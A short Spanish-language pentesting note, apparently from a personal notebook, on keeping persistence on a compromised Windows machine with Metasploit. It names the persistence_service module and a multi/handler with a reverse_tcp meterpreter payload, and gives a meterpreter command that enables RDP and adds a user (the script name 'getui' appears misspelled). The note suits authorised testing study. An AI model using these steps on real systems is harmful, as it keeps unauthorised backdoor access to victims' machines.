
## WINDOWS

Una vez tenemos una sesión dentro de la maquina objetivo, necesitaremos ser Administrador, poner la sesión en background y usar el modulo `exploit/windows/local/persistence_service`

Obtendremos una sesión de meterpreter, en la maquina se quedan unos archivos que hace que sea posible la persistencia en caso de cerrar la sesión, entonces cuando entremos de nuevo en [[METASPLOIT]] tendremos que usar el modulo `exploit/multi/handler` una vez dentro usar el payload `windows/meterpreter/reverse_tcp` y configurar el mismo puerto que configuramos en el exploit de persistencia

En caso de que sea vía RDP deberemos usar el siguiente comando en la sesion de meterpreter `run getui -e -u user -p password` y ahora nos podremos conectar via xfreerdp





